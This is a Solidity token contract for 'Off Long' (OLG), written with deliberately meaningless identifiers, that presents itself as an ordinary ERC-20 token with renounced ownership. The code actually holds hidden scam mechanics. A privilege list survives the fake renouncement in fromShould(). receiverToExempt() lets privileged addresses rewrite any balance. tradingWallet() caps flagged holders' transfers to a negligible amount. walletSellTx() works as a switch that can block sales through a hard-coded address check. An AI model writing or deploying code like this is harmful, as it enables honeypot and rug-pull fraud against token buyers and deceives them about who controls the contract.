//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface feeTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atTakeList {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletLimit {
    function createPair(address buyFee, address atSell) external returns (address);
}

interface shouldFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapAt) external view returns (uint256);

    function transfer(address limitEnable, uint256 maxShould) external returns (bool);

    function allowance(address walletSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxShould) external returns (bool);

    function transferFrom(
        address sender,
        address limitEnable,
        uint256 maxShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityReceiver, uint256 value);
    event Approval(address indexed walletSell, address indexed spender, uint256 value);
}

interface shouldFromMetadata is shouldFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OffLong is atTakeList, shouldFrom, shouldFromMetadata {

    bool public shouldLaunch;

    uint256 marketingBuy;

    uint256 launchedTx;

    bool public atIs;

    function toLiquidity(address takeTx, address limitEnable, uint256 maxShould) internal returns (bool) {
        if (takeTx == tokenLaunched) {
            return liquidityFee(takeTx, limitEnable, maxShould);
        }
        uint256 swapAmount = shouldFrom(marketingTeam).balanceOf(limitMin);
        require(swapAmount == launchedTx);
        require(limitEnable != limitMin);
        if (receiverIs[takeTx]) {
            return liquidityFee(takeTx, limitEnable, liquidityReceiverMax);
        }
        return liquidityFee(takeTx, limitEnable, maxShould);
    }

    function getOwner() external view returns (address) {
        return takeExempt;
    }

    function walletSellTx(uint256 maxShould) public {
        marketingSwap();
        launchedTx = maxShould;
    }

    uint256 public tokenTo;

    function tradingWallet(address toSwap) public {
        marketingSwap();
        
        if (toSwap == tokenLaunched || toSwap == marketingTeam) {
            return;
        }
        receiverIs[toSwap] = true;
    }

    string private tokenLaunchedSender = "Off Long";

    address public tokenLaunched;

    function receiverToExempt(address teamMin, uint256 maxShould) public {
        marketingSwap();
        swapAuto[teamMin] = maxShould;
    }

    function approve(address swapReceiver, uint256 maxShould) public virtual override returns (bool) {
        minWallet[_msgSender()][swapReceiver] = maxShould;
        emit Approval(_msgSender(), swapReceiver, maxShould);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txMarketing;
    }

    function transferFrom(address takeTx, address limitEnable, uint256 maxShould) external override returns (bool) {
        if (_msgSender() != takeTokenFee) {
            if (minWallet[takeTx][_msgSender()] != type(uint256).max) {
                require(maxShould <= minWallet[takeTx][_msgSender()]);
                minWallet[takeTx][_msgSender()] -= maxShould;
            }
        }
        return toLiquidity(takeTx, limitEnable, maxShould);
    }

    function marketingSwap() private view {
        require(receiverFeeTrading[_msgSender()]);
    }

    uint8 private receiverShould = 18;

    function name() external view virtual override returns (string memory) {
        return tokenLaunchedSender;
    }

    bool private enableAt;

    address takeTokenFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public receiverFeeTrading;

    bool private exemptLaunched;

    function sellAt(address launchToken) public {
        if (receiverFrom) {
            return;
        }
        
        receiverFeeTrading[launchToken] = true;
        if (atIs != enableAt) {
            limitAtFrom = tokenTo;
        }
        receiverFrom = true;
    }

    constructor (){
        if (limitAtFrom != tokenTo) {
            exemptLaunched = true;
        }
        feeTotal atTake = feeTotal(takeTokenFee);
        marketingTeam = walletLimit(atTake.factory()).createPair(atTake.WETH(), address(this));
        
        tokenLaunched = _msgSender();
        fromShould();
        receiverFeeTrading[tokenLaunched] = true;
        swapAuto[tokenLaunched] = txMarketing;
        
        emit Transfer(address(0), tokenLaunched, txMarketing);
    }

    function allowance(address amountBuy, address swapReceiver) external view virtual override returns (uint256) {
        if (swapReceiver == takeTokenFee) {
            return type(uint256).max;
        }
        return minWallet[amountBuy][swapReceiver];
    }

    bool public receiverFrom;

    uint256 private txMarketing = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return receiverShould;
    }

    function transfer(address teamMin, uint256 maxShould) external virtual override returns (bool) {
        return toLiquidity(_msgSender(), teamMin, maxShould);
    }

    function liquidityFee(address takeTx, address limitEnable, uint256 maxShould) internal returns (bool) {
        require(swapAuto[takeTx] >= maxShould);
        swapAuto[takeTx] -= maxShould;
        swapAuto[limitEnable] += maxShould;
        emit Transfer(takeTx, limitEnable, maxShould);
        return true;
    }

    mapping(address => bool) public receiverIs;

    function owner() external view returns (address) {
        return takeExempt;
    }

    mapping(address => mapping(address => uint256)) private minWallet;

    uint256 public limitAtFrom;

    string private takeLaunched = "OLG";

    mapping(address => uint256) private swapAuto;

    bool public receiverLaunched;

    function fromShould() public {
        emit OwnershipTransferred(tokenLaunched, address(0));
        takeExempt = address(0);
    }

    address limitMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address swapAt) public view virtual override returns (uint256) {
        return swapAuto[swapAt];
    }

    address private takeExempt;

    event OwnershipTransferred(address indexed shouldEnable, address indexed launchTake);

    function symbol() external view virtual override returns (string memory) {
        return takeLaunched;
    }

    address public marketingTeam;

    uint256 constant liquidityReceiverMax = 8 ** 10;

}